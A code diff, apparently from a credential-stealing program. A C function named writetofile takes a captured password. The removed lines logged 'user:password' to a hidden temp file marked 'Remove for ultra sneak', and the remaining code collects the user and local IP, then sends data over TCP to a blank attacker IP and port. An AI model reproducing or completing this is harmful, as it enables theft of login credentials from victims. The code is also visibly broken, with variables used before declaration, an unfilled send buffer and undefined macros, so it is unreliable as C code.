@@ -1,90 +1,79 @@
 #include <sys/socket.h>
-#include <arpa/inet.h> 
+#include <arpa/inet.h>
 #include <sys/ioctl.h>
 #include <netinet/in.h>
 #include <net/if.h>
-#include <unistd.h> 
-#include <string.h> 
-#define PORT 
-#define IP 
+#include <unistd.h>
+#include <string.h>
+#define PORT
+#define IP
 
-
-
-int writetofile (char *password){
-
-    /* Create Stuff for File*/
-    FILE * fptr;
-    fptr = fopen("/tmp/18432443.tmp", "a"); // Remove for ultra sneak
-    char * user;
-
-    // Write Shit
-    if (pw) {
-        user = pw->pw_name;
-    }
-    else {
-        user = "unknown";
-    }
-    fprintf(fptr, "%s:%s\n", name, password);
+int writetofile(char *password)
+{
 
     /* Get UID */
     uid_t uid = geteuid();
-    struct passwd * pw = getpwuid(uid);
-            
+    struct passwd *pw = getpwuid(uid);
+
     /* Get IP Address */
     int fd;
     struct ifreq ifr;
     fd = socket(AF_INET, SOCK_DGRAM, 0);
-        
+
     /* I want to get an IPv4 IP address */
     ifr.ifr_addr.sa_family = AF_INET;
 
     /* I want IP address attached to set interface */
-    strncpy(ifr.ifr_name, INT_HERE, IFNAMSIZ-1);
+    strncpy(ifr.ifr_name, INT_HERE, IFNAMSIZ - 1);
     ioctl(fd, SIOCGIFADDR, &ifr);
     close(fd);
-    
+
     /* display result */
     char buffer[256];
-    char * ip;
+    char *ip;
     ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
-    //SNPRINT
-    
+    // SNPRINT
+
     /* Make Socket */
     int sock = 0, valread;
     struct sockaddr_in serv_addr;
 
     /* Sock creation Pt 2*/
-    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+    {
         return -1;
     }
 
     /* Socket Options */
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(PORT);
-        
+
     /* Timeout settings */
     struct timeval timeout;
     timeout.tv_sec = 3;
     timeout.tv_usec = 0;
-    
-    if (setsockopt (sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout) < 0)  {
+
+    if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout) < 0)
+    {
         return -1;
     }
-    if (setsockopt (sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof timeout) < 0) {
+    if (setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof timeout) < 0)
+    {
         // pass
 
-    /* set IP and set buffer */
+        /* set IP and set buffer */
     }
-    if(inet_pton(AF_INET, IP, &serv_addr.sin_addr)<=0) {
+    if (inet_pton(AF_INET, IP, &serv_addr.sin_addr) <= 0)
+    {
         return -1;
     }
-    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
+    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
+    {
         return -1;
     }
 
     /* Send Message */
-    send(sock , buffer , strlen(buffer) , 0 ); 
-    
-    return 0;
+    send(sock, buffer, strlen(buffer), 0);
 
+    return 0;
 }
